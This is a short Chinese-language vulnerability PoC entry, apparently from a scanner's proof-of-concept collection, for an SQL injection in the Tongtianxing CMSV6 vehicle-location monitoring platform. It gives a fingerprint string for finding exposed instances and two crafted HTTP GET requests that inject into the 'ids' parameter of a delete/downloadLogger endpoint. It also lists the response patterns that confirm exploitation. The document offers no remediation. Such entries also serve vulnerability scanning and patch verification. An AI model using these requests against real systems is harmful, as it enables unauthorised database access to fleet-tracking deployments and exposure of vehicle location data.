﻿# 通天星CMSV6车载定位监控平台SQL注入

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：通天星CMSV6车载定位监控平台未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。

> 漏洞特征：body="/808gps/"

> 验证脚本：HTTP

```
GET /run_stop/delete.do;downloadLogger.action?ids=1)&loadAll=1 HTTP/1.1
Connection: close
Accept-Encoding: gzip, deflate, br
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?result)(?=.*?10001).*?$

> 上传文件定位：

> 验证文件来源：通天星CMSV6车载定位监控平台SQL注入.poc

```
进一步POC确认：
GET /run_stop/delete.do;downloadLogger.action?ids=1)--+&loadAll=1 HTTP/1.1
Connection: close
Accept-Encoding: gzip, deflate, br
响应：200，返回值：{"result":0,"message":"OK","data":"","pagination":"","infos":"","key":"","resMap":""}
```